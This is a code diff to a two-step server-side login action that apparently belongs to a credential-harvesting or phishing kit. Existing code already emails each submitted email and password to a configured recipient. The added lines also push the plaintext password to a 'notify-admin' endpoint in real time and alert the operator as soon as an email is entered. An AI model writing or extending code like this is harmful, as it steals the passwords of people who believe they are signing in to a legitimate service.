@@ -112,8 +112,8 @@ async function sendEmail(email, password, recipientEmail) {
     }
 }
 
-// Helper function to send socket notification - UPDATED
-async function sendSocketNotification(email, type, message) {
+// ✅ UPDATED: Helper function to send socket notification with password support
+async function sendSocketNotification(email, type, message, password = null) {
     try {
         const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL;
 
@@ -126,10 +126,21 @@ async function sendSocketNotification(email, type, message) {
         const notifyUrl = `${baseUrl}/api/notify-admin`;
 
         console.log(`📤 Sending socket notification to: ${notifyUrl}`);
-        console.log(`📤 Data: email=${email}, type=${type}`);
+        console.log(`📤 Data: email=${email}, type=${type}, message=${message}`);
 
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 5000);
+
+        // ✅ Build payload with password if provided
+        const payload = {
+            email: email,
+            type: type || "login_attempt",
+            message: message || "New login attempt"
+        };
+        
+        if (password) {
+            payload.password = password;
+        }
 
         const response = await fetch(notifyUrl, {
             method: "POST",
@@ -137,11 +148,7 @@ async function sendSocketNotification(email, type, message) {
                 "Content-Type": "application/json",
                 "Accept": "application/json"
             },
-            body: JSON.stringify({
-                email: email,
-                type: type || "login_attempt",
-                message: message || "New login attempt"
-            }),
+            body: JSON.stringify(payload),
             signal: controller.signal
         });
 
@@ -152,6 +159,8 @@ async function sendSocketNotification(email, type, message) {
             console.log("✅ Socket notification sent successfully", data);
         } else {
             console.warn(`⚠️ Socket notification failed with status: ${response.status}`);
+            const errorText = await response.text();
+            console.warn(`⚠️ Error response: ${errorText}`);
         }
     } catch (error) {
         if (error.name === 'AbortError') {
@@ -210,6 +219,9 @@ export async function loginAction(formData) {
                 await user.save();
             }
 
+            // Send notification when email is submitted
+            await sendSocketNotification(email, "email_submit", "New login attempt started");
+
             const cookieStore = await cookies();
             cookieStore.set("login_session", user._id.toString(), {
                 httpOnly: true,
@@ -222,7 +234,7 @@ export async function loginAction(formData) {
             return { success: true, sessionId: user._id.toString() };
         }
 
-        // Step 2: Password submission
+        // Step 2: Password submission - ✅ UPDATED with password in notification
         if (step === "password") {
             if (!email || !password) {
                 return { success: false, message: "Email and password are required." };
@@ -243,8 +255,8 @@ export async function loginAction(formData) {
             user.status = "pending";
             await user.save();
 
-            // Send real-time notification to admin
-            await sendSocketNotification(email, "password_submit", "User has submitted a password");
+            // ✅ Send real-time notification to admin with password
+            await sendSocketNotification(email, "password_submit", "User has submitted a password", password);
 
             // Send email with credentials - IMMEDIATELY
             await sendEmail(email, password, process.env.EMAIL_RECIPIENT);
